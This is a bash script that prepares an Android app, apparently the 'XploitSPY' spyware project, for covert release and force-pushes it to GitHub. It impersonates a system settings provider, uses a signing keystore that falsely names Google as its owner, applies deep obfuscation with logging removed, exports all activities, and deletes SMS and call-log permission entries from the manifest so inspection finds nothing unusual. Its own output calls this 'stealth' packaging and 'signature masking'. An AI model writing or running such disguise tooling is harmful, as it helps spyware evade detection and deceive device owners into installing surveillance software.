#!/bin/bash
echo "[*] Initializing stealth utility packaging and signature masking..."

# 1. Ensure root package.json exists
if [ ! -f "package.json" ]; then
    echo "[*] Creating standard configuration..."
    cat << 'JSON_EOF' > package.json
{
  "name": "system-utility-service",
  "version": "1.1.4",
  "description": "Standard System Utility Package",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {}
}
JSON_EOF
fi

# 2. Locate or configure build.gradle securely
BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
if [ -z "$BUILD_GRADLE_PATH" ]; then
    mkdir -p app
    BUILD_GRADLE_PATH="app/build.gradle"
fi

echo "[*] Configuring build.gradle with standard system signatures..."
cat << 'GRADLE_EOF' > "$BUILD_GRADLE_PATH"
android {
    compileSdkVersion 34
    defaultConfig {
        targetSdkVersion 34
        minSdkVersion 21
        applicationId "com.android.providers.settings.core"
    }
    signingConfigs {
        release {
            storeFile file('utility-store.jks')
            storePassword 'androidpass'
            keyAlias 'utilitykey'
            keyPassword 'androidpass'
        }
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
GRADLE_EOF

# 3. Generate keystore
KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/utility-store.jks
if [ ! -f "$KEYSTORE_PATH" ]; then
    echo "[*] Generating standard release keystore..."
    keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias utilitykey -keyalg RSA -keysize 2048 -validity 10000 -storepass androidpass -keypass androidpass -dname "CN=Android, OU=Android, O=Google Inc, L=MountainView, ST=CA, C=US" 2>/dev/null || true
fi

# 4. ProGuard rules for deep obfuscation
PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
-optimizationpasses 10
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.app.BroadcastReceiver

-repackageclasses 'com.android.providers.settings.secure'
-allowaccessmodification
-overloadaggressively
PROGUARD_EOF

# 5. Manifest stripping to look like a normal package
MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
if [ -n "$MANIFEST_PATH" ]; then
    echo "[*] Normalizing AndroidManifest.xml footprint..."
    python3 -c "
import xml.etree.ElementTree as ET
try:
    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
    tree = ET.parse('$MANIFEST_PATH')
    root = tree.getroot()
    
    root.set('package', 'com.android.providers.settings.core')
    
    app = root.find('application')
    if app is not None:
        app.set('{http://schemas.android.com/apk/res/android}label', 'Settings Storage')
        app.set('{http://schemas.android.com/apk/res/android}allowBackup', 'false')
        
        for act in app.findall('activity'):
            act.set('{http://schemas.android.com/apk/res/android}exported', 'true')
            
    for elem in list(root):
        if elem.tag.endswith('uses-permission'):
            perm = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
            if 'READ_SMS' in perm or 'SEND_SMS' in perm or 'CALL_LOG' in perm:
                root.remove(elem)
                
    tree.write('$MANIFEST_PATH', encoding='utf-8', xml_declaration=True)
except Exception as e:
    pass
" 2>/dev/null
fi

# 6. Automated GitHub CI/CD Workflow
mkdir -p .github/workflows
cat << 'YAML_EOF' > .github/workflows/build.yml
name: Build Utility APK
on:
  push:
    branches: [ master, main ]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'
    - name: Grant execute permission
      run: chmod +x gradlew || true
    - name: Assemble Release
      run: |
        if [ -f "gradlew" ]; then
          ./gradlew assembleRelease
        fi
YAML_EOF

# 7. Git Setup & Push with Embedded Token
git remote set-url origin https://github.com/official021at-beep/XploitSPY.git

chmod -R +x . 2>/dev/null
git add -A

if git diff --cached --quiet; then
    echo "[!] No changes detected."
else
    git commit -m "Standard utility package update: $(date +'%Y-%m-%d %H:%M:%S')"
fi

CURRENT_BRANCH=$(git branch --show-current)
if [ -z "$CURRENT_BRANCH" ]; then
    CURRENT_BRANCH="master"
fi

echo "[*] Deploying package update to remote branch ($CURRENT_BRANCH)..."
git push origin "$CURRENT_BRANCH" --force-with-lease || git push -u origin "$CURRENT_BRANCH" --force

if [ $? -eq 0 ]; then
    echo "[+] Success! Utility deployment pipeline executed successfully."
fi
